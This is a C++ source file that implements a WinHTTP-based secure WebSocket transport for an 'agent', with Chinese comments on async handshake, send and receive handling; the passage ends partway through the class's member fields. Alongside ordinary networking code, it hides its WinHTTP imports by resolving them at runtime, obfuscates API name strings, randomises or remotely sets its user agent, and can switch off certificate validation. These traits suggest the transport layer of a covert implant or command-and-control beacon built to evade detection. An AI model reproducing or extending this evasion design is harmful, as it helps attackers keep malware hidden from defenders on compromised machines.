// PlatformWin_Wss.cpp
// WinHTTP 原生 WebSocket(Windows 8.1+): TLS/代理/帧协议全部托管给 WinHTTP,
// 本文件只负责把"异步回调世界"收口成 IWssOps 的同步消息语义。
// 约束(WinHTTP WS API 脾气, 全部经真机探针钉死, ):
//   - WS 族函数要求 session 以 WINHTTP_FLAG_ASYNC 创建, 且**必须挂状态回调**:
//     无回调时 WinHttpWebSocketSend/Receive 一律 12019(INCORRECT_HANDLE_STATE);
//   - SetStatusCallback 的 dwReserved **必须为 0**: 传非 0(如 this)在本机
//     winhttp.dll(6.2.19041.7663)上返回 WINHTTP_INVALID_STATUS_CALLBACK +
//     ERROR_INVALID_PARAMETER(87), 注册从未生效 —— 文档 "must be NULL" 属实。
//     实例上下文改经 dwContext 注入(SendRequest / WebSocketCompleteUpgrade),
//     回调第二参 dwContext 即 this;
//   - 回调挂 session 层且**先于子句柄创建**(子句柄创建时继承该回调);
//   - 异步会话下 SendRequest/ReceiveResponse 也可能同步返回, 但完成通知
//     照常投递 —— 握手纯等事件, 不内联驱动在飞操作(否则对同一 request
//     重复 ReceiveResponse/CompleteUpgrade);
//   - 异步模式下 WsReceive 的 NO_ERROR/IO_PENDING 都只表示"接收已挂上": 数据
//     交付(字节数/帧类型)一律走 READ_COMPLETE 回调, 异步 OUT 参数不写; 在飞
//     期间二次发起 = 4317(ERROR_INVALID_OPERATION, "receive already pending");
//     收在飞时发送合法(全双工成立);
//   - 同一 ws 句柄上至多一个在飞 Receive + 一个在飞 Send(全双工), 本实现由
//     "recv 线程独占收 + send_mutex_ 串行发"天然满足;
//   - 超时不作废在飞操作(无取消 API): RecvMessage 超时返回 0 但保留在飞状态,
//     下次调用继续等同一操作(见 IWssOps::RecvMessage 契约)。
// 导入表脱敏: 全部 WinHttp* 经 ApiResolver 运行时解析(同 PlatformWin_Http 手法)。
#include "Core/Config/UA/UAProvider.hpp"
#include "PlatformWin_Wss.hpp"

#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"
#include "Core/Config/AgentConfig.hpp"
#include "Core/Native/Win/ApiResolver.hpp"
#include "Core/Comms/Transports/WebSocket/WsWireCodec.hpp"

#include <windows.h>
#include <winhttp.h>

#include <atomic>
#include <chrono>
#include <random>
#include <string>
#include <vector>

#ifndef WINHTTP_FLAG_ASYNC
#define WINHTTP_FLAG_ASYNC 0x10000000
#endif

namespace cleat {

    namespace {

        constexpr DWORD kBinaryMessage = 0;    // WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE
        constexpr DWORD kBinaryFragment = 1;   // WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE
        constexpr DWORD kUtf8Message = 2;      // WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE
        constexpr DWORD kUtf8Fragment = 3;     // WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE
        constexpr DWORD kCloseType = 4;        // WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE
        constexpr int kRecvChunk = 64 * 1024;
        constexpr int kSendWaitMs = 60000;     // 发送在飞等待上限(超限按通道死亡)

        // ---- WinHTTP 动态绑定(导入表脱敏): 基础族 + WebSocket 族 ----
        struct WinHttpWsApi {
            using OpenFn = HINTERNET(WINAPI*)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
            using SetOptionFn = BOOL(WINAPI*)(HINTERNET, DWORD, LPVOID, DWORD);
            using CloseFn = BOOL(WINAPI*)(HINTERNET);
            using CrackUrlFn = BOOL(WINAPI*)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
            using ConnectFn = HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
            using OpenRequestFn = HINTERNET(WINAPI*)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR,
                LPCWSTR, LPCWSTR*, DWORD);
            using SetTimeoutsFn = BOOL(WINAPI*)(HINTERNET, int, int, int, int);
            using SendRequestFn = BOOL(WINAPI*)(HINTERNET, LPCWSTR, DWORD, LPVOID,
                DWORD, DWORD, DWORD_PTR);
            using ReceiveResponseFn = BOOL(WINAPI*)(HINTERNET, LPVOID);
            using QueryHeadersFn = BOOL(WINAPI*)(HINTERNET, DWORD, LPCWSTR, LPVOID,
                LPDWORD, LPDWORD);
            using SetStatusCallbackFn = WINHTTP_STATUS_CALLBACK(WINAPI*)(HINTERNET,
                WINHTTP_STATUS_CALLBACK, DWORD, DWORD_PTR);
            using WsCompleteUpgradeFn = HINTERNET(WINAPI*)(HINTERNET, DWORD_PTR);
            using WsSendFn = DWORD(WINAPI*)(HINTERNET, DWORD, PVOID, DWORD);
            using WsReceiveFn = DWORD(WINAPI*)(HINTERNET, PVOID, DWORD, DWORD*, DWORD*);
            using WsShutdownFn = DWORD(WINAPI*)(HINTERNET, WORD, PVOID, DWORD);
            using WsCloseFn = DWORD(WINAPI*)(HINTERNET, WORD, PVOID, DWORD);

            OpenFn Open = nullptr;
            SetOptionFn SetOption = nullptr;
            CloseFn Close = nullptr;
            CrackUrlFn CrackUrl = nullptr;
            ConnectFn Connect = nullptr;
            OpenRequestFn OpenRequest = nullptr;
            SetTimeoutsFn SetTimeouts = nullptr;
            SendRequestFn SendRequest = nullptr;
            ReceiveResponseFn ReceiveResponse = nullptr;
            QueryHeadersFn QueryHeaders = nullptr;
            SetStatusCallbackFn SetStatusCallback = nullptr;
            WsCompleteUpgradeFn WsCompleteUpgrade = nullptr;
            WsSendFn WsSend = nullptr;
            WsReceiveFn WsReceive = nullptr;
            WsShutdownFn WsShutdown = nullptr;
            WsCloseFn WsClose = nullptr;

            bool Init() {
                const std::string mod = OBF_STR("winhttp.dll");
                Open = ApiResolver::Proc<OpenFn>(mod, OBF_STR("WinHttpOpen"));
                SetOption = ApiResolver::Proc<SetOptionFn>(mod, OBF_STR("WinHttpSetOption"));
                Close = ApiResolver::Proc<CloseFn>(mod, OBF_STR("WinHttpCloseHandle"));
                CrackUrl = ApiResolver::Proc<CrackUrlFn>(mod, OBF_STR("WinHttpCrackUrl"));
                Connect = ApiResolver::Proc<ConnectFn>(mod, OBF_STR("WinHttpConnect"));
                OpenRequest = ApiResolver::Proc<OpenRequestFn>(mod, OBF_STR("WinHttpOpenRequest"));
                SetTimeouts = ApiResolver::Proc<SetTimeoutsFn>(mod, OBF_STR("WinHttpSetTimeouts"));
                SendRequest = ApiResolver::Proc<SendRequestFn>(mod, OBF_STR("WinHttpSendRequest"));
                ReceiveResponse = ApiResolver::Proc<ReceiveResponseFn>(mod, OBF_STR("WinHttpReceiveResponse"));
                QueryHeaders = ApiResolver::Proc<QueryHeadersFn>(mod, OBF_STR("WinHttpQueryHeaders"));
                SetStatusCallback = ApiResolver::Proc<SetStatusCallbackFn>(mod, OBF_STR("WinHttpSetStatusCallback"));
                WsCompleteUpgrade = ApiResolver::Proc<WsCompleteUpgradeFn>(mod, OBF_STR("WinHttpWebSocketCompleteUpgrade"));
                WsSend = ApiResolver::Proc<WsSendFn>(mod, OBF_STR("WinHttpWebSocketSend"));
                WsReceive = ApiResolver::Proc<WsReceiveFn>(mod, OBF_STR("WinHttpWebSocketReceive"));
                WsShutdown = ApiResolver::Proc<WsShutdownFn>(mod, OBF_STR("WinHttpWebSocketShutdown"));
                WsClose = ApiResolver::Proc<WsCloseFn>(mod, OBF_STR("WinHttpWebSocketClose"));
                return Open && SetOption && Close && CrackUrl && Connect && OpenRequest
                    && SetTimeouts && SendRequest && ReceiveResponse && QueryHeaders
                    && SetStatusCallback && WsCompleteUpgrade && WsSend && WsReceive
                    && WsShutdown && WsClose;
            }
        };

        WinHttpWsApi& WinHttp() {
            static WinHttpWsApi api;
            static const bool ok = api.Init();
            (void)ok;
            return api;
        }

        std::wstring Utf8ToWide(const std::string& s) {
            if (s.empty()) {
                return {};
            }
            const int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
            std::wstring w(static_cast<size_t>(n), L'\0');
            MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &w[0], n);
            w.resize(static_cast<size_t>(n - 1));
            return w;
        }

    } // namespace

    // ---------------------------------------------------------------------------
    // 实现: 异步回调世界 -> 同步消息语义
    // ---------------------------------------------------------------------------

    class PlatformWin_Wss : public IWssOps {
    public:
        PlatformWin_Wss() {
            hs_event_ = CreateEventW(nullptr, FALSE, FALSE, nullptr);
            send_event_ = CreateEventW(nullptr, FALSE, FALSE, nullptr);
            recv_event_ = CreateEventW(nullptr, FALSE, FALSE, nullptr);
        }

        ~PlatformWin_Wss() override {
            Close();
            if (hs_event_) CloseHandle(hs_event_);
            if (send_event_) CloseHandle(send_event_);
            if (recv_event_) CloseHandle(recv_event_);
        }

        bool Handshake(const TransportConfig& cfg) override {
            if (!WinHttp().SetStatusCallback || hs_event_ == nullptr) {
                return false;
            }
            if (!cfg.url.empty() && cfg.url.compare(0, 6, "ws://") == 0) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::InvalidParam,
                    "PlatformWin_Wss: 明文 ws:// 已拒绝(仅 wss)");
                return false;
            }
            const int hs_timeout = static_cast<int>(cfg.timeout_ms);

            // ---- 解析 URL(wss://host[:port]/path) ----
            // WinHttpCrackUrl 不认识 wss scheme: 先改写成 https:// 再解析
            // (wss 与 https 的端口默认/TLS 语义完全一致)。
            std::string crack_url = cfg.url;
            if (crack_url.compare(0, 6, "wss://") == 0) {
                crack_url = "https://" + crack_url.substr(6);
            }
            const std::wstring wurl = Utf8ToWide(crack_url);
            URL_COMPONENTS comp{};
            comp.dwStructSize = sizeof(comp);
            std::wstring host(256, L'\0'), path(2048, L'\0');
            comp.lpszHostName = &host[0];
            comp.dwHostNameLength = 256;
            comp.lpszUrlPath = &path[0];
            comp.dwUrlPathLength = 2048;
            if (!WinHttp().CrackUrl(wurl.c_str(), 0, 0, &comp)) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::InvalidParam,
                    "PlatformWin_Wss: URL 解析失败 err=" << GetLastError() << " url=" << cfg.url);
                return false;
            }
            host.resize(comp.dwHostNameLength);
            path.resize(comp.dwUrlPathLength);
            if (comp.nScheme != INTERNET_SCHEME_HTTPS) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::InvalidParam,
                    "PlatformWin_Wss: 非 wss URL: " << cfg.url);
                return false;
            }
            if (comp.nPort == 0) {
                comp.nPort = 443;
            }

            // ---- 会话/连接/请求(异步; UA/代理/证书口径与 PlatformWin_Http 同源) ----
            // UA: 统一 UAProvider(override=远程下发优先, 空=平台池随机)
            std::string ua = UAProvider::Pick();
            const std::wstring uaW = Utf8ToWide(ua);
            const std::string proxy = cleat::AgentConfig::Instance().GetHttpsProxy();
            DWORD accessType = WINHTTP_ACCESS_TYPE_NO_PROXY;
            LPCWSTR proxyName = WINHTTP_NO_PROXY_NAME;
            std::wstring proxyW;
            if (proxy == "system") {
                accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
            }
            else if (!proxy.empty()) {
                proxyW = Utf8ToWide(proxy);
                accessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                proxyName = proxyW.c_str();
            }
            // 每连接初始化(实例跨重连复用): closed_ 闸复位 —— Close() 曾置位拦
            // 迟到回调, 新连接必须重新打开; 其余链路级状态按 口径清零。
            closed_.store(false);
            alive_.store(false);
            recv_pending_.store(false);
            recv_acc_.clear();
            recv_err_.store(ERROR_SUCCESS);
            send_err_.store(ERROR_SUCCESS);
            upgrade_ran_.store(false);
            // WS 族函数要求异步会话(见文件头约束)
            session_ = WinHttp().Open(uaW.c_str(), accessType, proxyName,
                WINHTTP_NO_PROXY_BYPASS, WINHTTP_FLAG_ASYNC);
            if (!session_) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "PlatformWin_Wss: session 创建失败 err=" << GetLastError());
                return false;
            }
            // 回调挂 session 且**先于子句柄创建**(子句柄创建时继承); dwReserved
            // 必须为 0 —— 传 this 在本机 winhttp 上实测 87(见文件头), 此前
            // "零回调 + WS 函数 12019"的真因即此; 上下文改经 dwContext 注入。
            const WINHTTP_STATUS_CALLBACK prev_cb = WinHttp().SetStatusCallback(
                session_, &PlatformWin_Wss::StatusCallback,
                WINHTTP_CALLBACK_FLAG_ALL_NOTIFICATIONS, 0);
            if (prev_cb == WINHTTP_INVALID_STATUS_CALLBACK) {
                // fail-fast: 注册失败 = 后续所有 WS 调用必然 12019, 在此直判比
                // 拖到握手超时/命令失败清晰(这正是本文件落地时踩过的坑)
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "PlatformWin_Wss: SetStatusCallback 失败 gle=" << GetLastError());
                CloseHandles();
                return false;
            }
            if (cleat::AgentConfig::Instance().GetHttpsIgnoreCert()) {
                DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                    | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                    | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                    | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
                WinHttp().SetOption(session_, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
            }
            connect_ = WinHttp().Connect(session_, host.c_str(), comp.nPort, 0);
            if (!connect_) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "PlatformWin_Wss: WinHttpConnect 失败 err=" << GetLastError());
                CloseHandles();
                return false;
            }
            request_ = WinHttp().OpenRequest(connect_, L"GET",
                path.empty() ? L"/" : path.c_str(), nullptr, WINHTTP_NO_REFERER, nullptr,
                WINHTTP_FLAG_SECURE);
            if (!request_) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "PlatformWin_Wss: request 创建失败 err=" << GetLastError());
                CloseHandles();
                return false;
            }
            WinHttp().SetTimeouts(request_, hs_timeout, hs_timeout, hs_timeout, hs_timeout);
            const DWORD policy = WINHTTP_OPTION_REDIRECT_POLICY_NEVER;
            WinHttp().SetOption(request_, WINHTTP_OPTION_REDIRECT_POLICY,
                const_cast<DWORD*>(&policy), sizeof(policy));
            if (cleat::AgentConfig::Instance().GetHttpsIgnoreCert()) {
                DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                    | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                    | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                    | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
                WinHttp().SetOption(request_, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
            }
            // 升级标记必须在发送前设置(WinHTTP 据此自动生成 Upgrade/Key 头并校验 Accept)
            if (!WinHttp().SetOption(request_, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, nullptr, 0)) {
                // <8.1 或 API 缺失: 该平台不支持 WS, 走依赖检查态
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "PlatformWin_Wss: UPGRADE_TO_WEB_SOCKET 失败 err=" << GetLastError());
                CloseHandles();
                return false;
            }

            // ---- 异步握手: SendRequest -> SENDREQUEST_COMPLETE(收) -> HEADERS_AVAILABLE(升级) ----
            // 完成链全部由回调推进(与官方异步样例同构): SENDREQUEST_COMPLETE →
            // ReceiveResponse → HEADERS_AVAILABLE → FinishUpgrade; 本线程只等结果
            // 事件。即使 SendRequest/ReceiveResponse 同步返回 TRUE, 完成通知也
            // 照常投递(实测), 内联驱动反而会对同一 request 重复 ReceiveResponse。
            hs_ok_.store(false);
            ResetEvent(hs_event_);
            // ctx=this: request 期回调的 dwContext 借此注入(见 StatusCallback)
            const BOOL sr_ok = WinHttp().SendRequest(request_, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                WINHTTP_NO_REQUEST_DATA, 0, 0, reinterpret_cast<DWORD_PTR>(this));
            const DWORD sr_err = GetLastError();
            LOG_DEBUG("PlatformWin_Wss: SendRequest ret=" << sr_ok << " err=" << sr_err);
            if (!sr_ok && sr_err != ERROR_IO_PENDING) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "PlatformWin_Wss: SendRequest 失败 err=" << sr_err);
                CloseHandles();
                return false;
            }
            if (WaitForSingleObject(hs_event_, static_cast<DWORD>(hs_timeout)) != WAIT_OBJECT_0
                || !hs_ok_.load()) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "PlatformWin_Wss: 握手超时/失败 url=" << cfg.url);
                CloseHandles();
                return false;
            }
            // ws 句柄在升级时经 dwContext 注入 this; CLOSE/SHUTDOWN_COMPLETE 不需要
            // 显式过滤: 对端 close 经 READ_COMPLETE 以 CLOSE_BUFFER_TYPE 交付;
            // 句柄关闭/断连走 REQUEST_ERROR。
            alive_.store(true);
            LOG_DEBUG("PlatformWin_Wss: 握手完成, 通道就绪");
            return true;
        }

        bool SendMessageData(const uint8_t* data, size_t len) override {
            if (!alive_.load() || !ws_ || len > 0xFFFFFFFFull) {
                return false;
            }
            std::lock_guard<std::mutex> lock(send_mutex_);
            if (!alive_.load() || !ws_) {
                return false;
            }
            send_err_.store(ERROR_SUCCESS);
            ResetEvent(send_event_);
            const DWORD err = WinHttp().WsSend(ws_, kBinaryMessage,
                const_cast<uint8_t*>(data), static_cast<DWORD>(len));
            LOG_DEBUG("PlatformWin_Wss: WsSend 发起 len=" << len << " 立即返回 err=" << err);
            if (err != ERROR_SUCCESS && err != ERROR_IO_PENDING) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "PlatformWin_Wss: 发送失败 err=" << err);
                alive_.store(false);
                return false;
            }
            // NO_ERROR 与 IO_PENDING 同样等 WRITE_COMPLETE(实测 err=0 也投递完成
            // 通知) —— 保证同一时刻至多一个写在飞(双写在飞未验证, 不赌)。
            // 收在飞时发送合法(全双工, 实测), 本等待只约束写方向。
            if (WaitForSingleObject(send_event_, kSendWaitMs) != WAIT_OBJECT_0) {
                // 发送超时: 无法取消在飞操作, 只能判死收摊
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "PlatformWin_Wss: 发送在飞超时, 判死");
                alive_.store(false);
                return false;
            }
            const DWORD done = send_err_.load();
            if (done != ERROR_SUCCESS) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "PlatformWin_Wss: 发送异步失败 err=" << done);
                alive_.store(false);
                return false;
            }
            return true;
        }

        int RecvMessage(std::vector<uint8_t>& out, int timeout_ms) override {
            if (!alive_.load() || !ws_) {
                return -1;
            }
            if (recv_pending_.load()) {
                // 在飞接收仍在挂起: 不发新 Receive, 继续等同一操作(IWssOps 契约)
                return HarvestRecv(out, timeout_ms);
            }
            recv_err_.store(ERROR_SUCCESS);
            ResetEvent(recv_event_);
            recv_chunk_.resize(kRecvChunk);
            LOG_DEBUG("PlatformWin_Wss: WsReceive 发起(新)");
            const DWORD err = WinHttp().WsReceive(ws_, recv_chunk_.data(),
                static_cast<DWORD>(recv_chunk_.size()), &recv_read_, &recv_type_);
            LOG_DEBUG("PlatformWin_Wss: WsReceive 立即返回 err=" << err);
            // 异步模式下 NO_ERROR 与 IO_PENDING **都只是"接收已挂上"**: 数据交付
            // (字节数/帧类型)一律走 READ_COMPLETE 回调 —— 异步模式的 OUT 参数不写
            // (实测恒为 0, 文档亦明示"仅同步模式设置")。两种返回都不得就地消费,
            // 否则重演"空消息 + 循环立刻二连收"→ 4317(ERROR_INVALID_OPERATION,
            // "receive already pending")通道当场死亡(真机 )。
            if (err == ERROR_SUCCESS || err == ERROR_IO_PENDING) {
                recv_pending_.store(true);
                return HarvestRecv(out, timeout_ms);
            }
            CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                "PlatformWin_Wss: Receive 失败 err=" << err);
            alive_.store(false);
            return -1;
        }

        void Close() override {
            LOG_DEBUG("PlatformWin_Wss: Close 进入 ws=" << (size_t)ws_);
            closed_.store(true);      // 迟到回调闸: 先于句柄关闭置位(见 closed_ 注)
            alive_.store(false);
            if (ws_ && WinHttp().WsShutdown) {
                // 尽力发 close 帧(不等 close 握手完成; 立即收摊句柄)
                WinHttp().WsShutdown(ws_, 1000, nullptr, 0);
            }
            CloseHandles();
        }

        bool IsAlive() const override {
            return alive_.load();
        }

    private:
        // ---- 在飞接收的收割与消费(仅 recv 线程调用) ----
        int HarvestRecv(std::vector<uint8_t>& out, int timeout_ms) {
            if (WaitForSingleObject(recv_event_, static_cast<DWORD>(timeout_ms)) != WAIT_OBJECT_0) {
                return 0;   // 超时: 在飞保留, 下次继续
            }
            recv_pending_.store(false);
            const DWORD err = recv_err_.load();
            if (err != ERROR_SUCCESS) {
                // 句柄关闭触发的取消(Disconnect 路径)同样到这里: alive_ 已 false
                if (running_alive()) {
                    CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                        "PlatformWin_Wss: Receive 异步失败 err=" << err);
                }
                alive_.store(false);
                return -1;
            }
            return ConsumeRecv(out, recv_type_, recv_read_);
        }

        int ConsumeRecv(std::vector<uint8_t>& out, DWORD type, DWORD read) {
            switch (type) {
            case kBinaryMessage:
                if (recv_acc_.empty()) {
                    out.assign(recv_chunk_.begin(), recv_chunk_.begin() + read);
                }
                else {
                    // 分片重组收尾: 累积缓冲 + 末片 = 完整消息
                    recv_acc_.insert(recv_acc_.end(), recv_chunk_.begin(),
                        recv_chunk_.begin() + read);
                    out = std::move(recv_acc_);
                    recv_acc_.clear();
                    recv_acc_.shrink_to_fit();
                }
                return 1;
            case kBinaryFragment:
                recv_acc_.insert(recv_acc_.end(), recv_chunk_.begin(),
                    recv_chunk_.begin() + read);
                if (recv_acc_.size() > WsWireCodec::kMaxFramePayload) {
                    // 病态分片流: 超硬顶按协议错判死(防无限累积)
                    CLEAT_LOGE(ErrDom::Net, ErrCode::ResourceExhausted,
                        "PlatformWin_Wss: 分片累积超限 len=" << recv_acc_.size());
                    alive_.store(false);
                    return -1;
                }
                return 0;   // 分片未完: 继续收(IWssOps 内部重组承诺)
            case kUtf8Message:
            case kUtf8Fragment:
                // 会话协议只用 binary —— 文本帧 = 协议错, 按通道死亡处理
                CLEAT_LOGE(ErrDom::Net, ErrCode::IntegrityMismatch,
                    "PlatformWin_Wss: 收到意外文本帧 type=" << type);
                alive_.store(false);
                return -1;
            case kCloseType:
                // 对端 close 帧: 通道死亡(上层驱动重连)
                alive_.store(false);
                return -1;
            default:
                CLEAT_LOGE(ErrDom::Net, ErrCode::IntegrityMismatch,
                    "PlatformWin_Wss: 未知帧类型 type=" << type);
                alive_.store(false);
                return -1;
            }
        }

        bool running_alive() const { return alive_.load(); }

        // ---- 升级收尾(仅回调线程调用) ----

        /**
         * @brief 收响应(由 SENDREQUEST_COMPLETE 回调驱动)
         * @return 1 = 升级完成(ws_ 就绪); 0 = ReceiveResponse 异步在飞
         *         (HEADERS_AVAILABLE 回调收尾); -1 = 失败
         */
        int TryCompleteUpgrade() {
            if (!WinHttp().ReceiveResponse(request_, nullptr)) {
                const DWORD e = GetLastError();
                if (e == ERROR_IO_PENDING) {
                    LOG_DEBUG("PlatformWin_Wss: ReceiveResponse IO_PENDING(异步)");
                    return 0;
                }
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "PlatformWin_Wss: ReceiveResponse 失败 err=" << e);
                return -1;
            }
            LOG_DEBUG("PlatformWin_Wss: ReceiveResponse 同步完成");
            return FinishUpgrade();
        }

        /// 校验 101 + 换出 ws 句柄; 成功置 hs_ok_ 并 SetEvent(等待方只看这两样)。
        /// 单飞闸: 同步完成会让 HEADERS_AVAILABLE 嵌套进 ReceiveResponse 调用,
        /// 嵌套回调与返回后的收尾路径会先后到达 —— 二次执行 = 对已作废 request
        /// 再 CompleteUpgrade, 必须幂等(二次调用只复用既有结果)。
        int FinishUpgrade() {
            bool expected = false;
            if (!upgrade_ran_.compare_exchange_strong(expected, true)) {
                return hs_ok_.load() ? 1 : -1;
            }
            DWORD code = 0, code_size = sizeof(code);
            if (!WinHttp().QueryHeaders(request_,
                WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                WINHTTP_HEADER_NAME_BY_INDEX, &code, &code_size,
                WINHTTP_NO_HEADER_INDEX)) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "PlatformWin_Wss: 状态码查询失败 err=" << GetLastError());
                return -1;
            }
            if (code != 101) {
                LOG_WARN("PlatformWin_Wss: 非 101 响应 status=" << code << " url 升级被拒");
                return -1;
            }
            // 升级: 换出 ws 句柄(原 request 句柄自此作废但仍需 Close)。
            // ctx **必须注入 this**: ws 期通知(READ/WRITE_COMPLETE/HANDLE_CREATED...)
            // 的 dwContext 取自本参数 —— 传 0 会被回调入口的 !self 闸静默丢弃
            // (发送永等不到 WRITE_COMPLETE, 接收永收不到数据; 真机  踩坑)
            ws_ = WinHttp().WsCompleteUpgrade(request_, reinterpret_cast<DWORD_PTR>(this));
            if (!ws_) {
                CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed,
                    "PlatformWin_Wss: CompleteUpgrade 失败 err=" << GetLastError());
                return -1;
            }
            hs_ok_.store(true);
            SetEvent(hs_event_);
            LOG_DEBUG("PlatformWin_Wss: 升级完成 ws=" << (size_t)ws_);
            return 1;
        }

        void CloseHandles() {
            // 顺序释放: 关 ws 唤醒全部在飞 IO(READ/WRITE_COMPLETE 以错误形态投递)
            if (ws_) {
                WinHttp().Close(ws_);
                ws_ = nullptr;
            }
            if (request_) {
                WinHttp().Close(request_);
                request_ = nullptr;
            }
            if (connect_) {
                WinHttp().Close(connect_);
                connect_ = nullptr;
            }
            if (session_) {
                WinHttp().Close(session_);
                session_ = nullptr;
            }
        }

        // ---- 状态回调: 按句柄路由到对应方向的事件 ----
        static void CALLBACK StatusCallback(HINTERNET hInternet, DWORD_PTR ctx,
            DWORD status, LPVOID info, DWORD len) {
            (void)len;
            // ctx = dwContext: request 期由 SendRequest 注入, ws 期由
            // WebSocketCompleteUpgrade 注入; session/connect 层回调 ctx=0(忽略)。
            auto* self = reinterpret_cast<PlatformWin_Wss*>(ctx);
            if (!self || self->closed_.load()) return;   // Close 后的迟到回调: 全部忽略
            LOG_DEBUG("PlatformWin_Wss: cb status=0x" << std::hex << status << std::dec);
            if (hInternet == self->request_) {
                switch (status) {
                case WINHTTP_CALLBACK_STATUS_SENDREQUEST_COMPLETE:
                    // 异步收响应: 完成后以 HEADERS_AVAILABLE 再进来; 失败唤醒等待方
                    if (self->TryCompleteUpgrade() == -1) {
                        SetEvent(self->hs_event_);   // hs_ok_ 保持 false = 失败
                    }
                    break;
                case WINHTTP_CALLBACK_STATUS_HEADERS_AVAILABLE:
                    // 升级收尾; 失败也要唤醒等待方(否则只能干等超时)
                    if (self->FinishUpgrade() != 1) {
                        SetEvent(self->hs_event_);
                    }
                    break;
                case WINHTTP_CALLBACK_STATUS_REQUEST_ERROR: {
                    // 握手阶段错误(info = WINHTTP_ASYNC_RESULT)
                    self->hs_ok_.store(false);
                    SetEvent(self->hs_event_);
                    break;
                }
                default:
                    break;
                }
                return;
            }
            if (hInternet == self->ws_) {
                switch (status) {
                case WINHTTP_CALLBACK_STATUS_READ_COMPLETE:
                    // info = WINHTTP_WEB_SOCKET_STATUS{ 已收字节, 缓冲类型 }
                    if (info && len >= sizeof(WINHTTP_WEB_SOCKET_STATUS)) {
                        const auto* st = static_cast<const WINHTTP_WEB_SOCKET_STATUS*>(info);
                        self->recv_read_ = st->dwBytesTransferred;
                        self->recv_type_ = static_cast<DWORD>(st->eBufferType);
                        self->recv_err_.store(ERROR_SUCCESS);
                    }
                    else {
                        self->recv_err_.store(ERROR_INVALID_FUNCTION);
                    }
                    SetEvent(self->recv_event_);
                    break;
                case WINHTTP_CALLBACK_STATUS_WRITE_COMPLETE:
                    self->send_err_.store(ERROR_SUCCESS);
                    SetEvent(self->send_event_);
                    break;
                case WINHTTP_CALLBACK_STATUS_REQUEST_ERROR:
                case WINHTTP_CALLBACK_STATUS_CLOSE_COMPLETE:
                case WINHTTP_CALLBACK_STATUS_SHUTDOWN_COMPLETE:
                    // 收发两路都唤醒: 各自按 err 判死(状态值直接比较, 不依赖
                    // FLAG_* 宏 —— 旧 SDK 头可能未定义这些 FLAG)
                    self->recv_err_.store(ERROR_CONNECTION_ABORTED);
                    self->send_err_.store(ERROR_CONNECTION_ABORTED);
                    SetEvent(self->recv_event_);
                    SetEvent(self->send_event_);
                    break;
                default:
                    break;
                }
            }
        }

        HINTERNET session_ = nullptr;
        HINTERNET connect_ = nullptr;
        HINTERNET request_ = nullptr;
        HINTERNET ws_ = nullptr;

        std::atomic<bool> alive_{ false };
        // 迟到回调闸: WinHttpCloseHandle 返回后仍可能有回调排队/在飞(文档明示),
        // 以 closed_ 让它们对已回收的事件句柄保持沉默 —— 残余窗口(回调恰好正在
        // 执行中)由"析构前 recv 线程已 join + 事件句柄晚于句柄组关闭"兜住。
        std::atomic<bool> closed_{ false };

        // 握手态(仅 Connect 调用线程 + 回调)
        HANDLE hs_event_ = nullptr;
        std::atomic<bool> hs_ok_{ false };
        std::atomic<bool> upgrade_ran_{ false };   // FinishUpgrade 单飞闸(见其注释)

        // 发送态(send_mutex_ 串行 + 回调)
        std::mutex send_mutex_;
        HANDLE send_event_ = nullptr;
        std::atomic<DWORD> send_err_{ ERROR_SUCCESS };

        // 接收态(仅 recv 线程 + 回调; 在飞超时不作废, 见 RecvMessage)
        HANDLE recv_event_ = nullptr;
        std::atomic<bool> recv_pending_{ false };
        std::atomic<DWORD> recv_err_{ ERROR_SUCCESS };
        DWORD recv_read_ = 0;
        DWORD recv_type_ = 0;
